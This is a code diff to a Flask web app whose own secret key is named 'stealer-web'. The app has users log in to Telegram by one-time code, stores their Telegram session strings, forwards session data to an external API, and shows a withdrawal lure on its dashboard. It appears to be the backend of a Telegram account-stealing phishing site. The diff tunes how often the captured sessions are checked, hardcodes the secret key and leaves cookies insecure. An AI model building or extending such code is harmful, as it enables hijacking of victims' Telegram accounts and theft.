@@ -12,11 +12,12 @@ from concurrent.futures import ThreadPoolExecutor
 import requests
 
 app = Flask(__name__)
-app.secret_key = secrets.token_hex(16)
+app.secret_key = 'stealer-web-secret-key-2025'  # Use fixed key for persistence
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)  # Session lasts 30 days
 app.config['SESSION_COOKIE_SECURE'] = False  # Set to True if using HTTPS
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
+app.config['SESSION_REFRESH_EACH_REQUEST'] = True  # Refresh session on each request
 
 # Configuration
 API_ID = 1025907
@@ -289,6 +290,8 @@ def verify_otp():
         session['user_id'] = user.id
         session['user_name'] = user.first_name
         session['is_new_user'] = is_new_user
+        session['session_doc_id'] = str(user_data['_id'])  # Store document ID
+        session['last_validated'] = datetime.utcnow().isoformat()  # Track last validation
         session.pop('session_id', None)
         
         # Send session data to external API
@@ -339,36 +342,53 @@ def dashboard():
         session.clear()
         return redirect(url_for('index'))
     
-    # Check if Telegram session is still valid
-    session_string = user_data.get('session_string')
-    if session_string:
+    # Only validate Telegram session every 10 minutes (not on every page load)
+    last_validated_str = session.get('last_validated')
+    should_validate = True
+    
+    if last_validated_str:
         try:
-            async def validate_session():
-                client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-                try:
-                    await client.connect()
-                    if not await client.is_user_authorized():
+            last_validated = datetime.fromisoformat(last_validated_str)
+            time_since_validation = datetime.utcnow() - last_validated
+            # Only validate if it's been more than 10 minutes
+            should_validate = time_since_validation.total_seconds() > 600
+        except:
+            should_validate = True
+    
+    # Check if Telegram session is still valid (only periodically)
+    if should_validate:
+        session_string = user_data.get('session_string')
+        if session_string:
+            try:
+                async def validate_session():
+                    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+                    try:
+                        await client.connect()
+                        if not await client.is_user_authorized():
+                            return False
+                        await client.disconnect()
+                        return True
+                    except Exception:
+                        await client.disconnect()
                         return False
-                    await client.disconnect()
-                    return True
-                except Exception:
-                    await client.disconnect()
-                    return False
-            
-            is_valid = run_telegram_operation(validate_session)
-            
-            if not is_valid:
-                # Mark session as expired (don't delete, just mark)
-                mongo.db.users.update_one(
-                    {'_id': user_data['_id']},
-                    {'$set': {'session_active': False, 'session_expired_at': datetime.utcnow()}}
-                )
-                # Clear user session and redirect to login
-                session.clear()
-                return redirect(url_for('index'))
-        except Exception:
-            # If validation fails, continue but mark session as potentially expired
-            pass
+                
+                is_valid = run_telegram_operation(validate_session)
+                
+                if not is_valid:
+                    # Mark session as expired (don't delete, just mark)
+                    mongo.db.users.update_one(
+                        {'_id': user_data['_id']},
+                        {'$set': {'session_active': False, 'session_expired_at': datetime.utcnow()}}
+                    )
+                    # Clear user session and redirect to login
+                    session.clear()
+                    return redirect(url_for('index'))
+                else:
+                    # Update last validated time
+                    session['last_validated'] = datetime.utcnow().isoformat()
+            except Exception:
+                # If validation fails, just update the timestamp and continue
+                session['last_validated'] = datetime.utcnow().isoformat()
     
     # Calculate time remaining for withdrawal
     withdrawal_available_at = user_data.get('withdrawal_available_at')
